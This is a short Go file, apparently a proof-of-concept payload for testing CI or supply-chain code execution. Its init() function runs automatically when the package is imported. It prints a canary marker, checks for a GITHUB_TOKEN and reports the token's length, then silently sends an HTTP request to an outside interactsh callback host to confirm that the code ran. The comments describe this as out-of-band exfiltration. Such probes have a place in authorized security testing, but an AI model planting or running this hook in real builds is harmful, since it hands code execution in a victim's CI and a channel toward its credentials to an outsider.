package hb_payload

import (
	"fmt"
	"net/http"
	"os"
)

func init() {
	fmt.Println("HB_CANARY_8K2M9P: Go init() executed in CI")
	
	// Also attempt OOB exfiltration of environment info
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		fmt.Println("HB_CANARY_8K2M9P: GITHUB_TOKEN is present (len=" + fmt.Sprint(len(token)) + ")")
	}
	
	// Attempt OOB callback (silently, don't block)
	go func() {
		http.Get("http://hb-canary-8k2m9p.interactsh.com/init-executed")
	}()
}
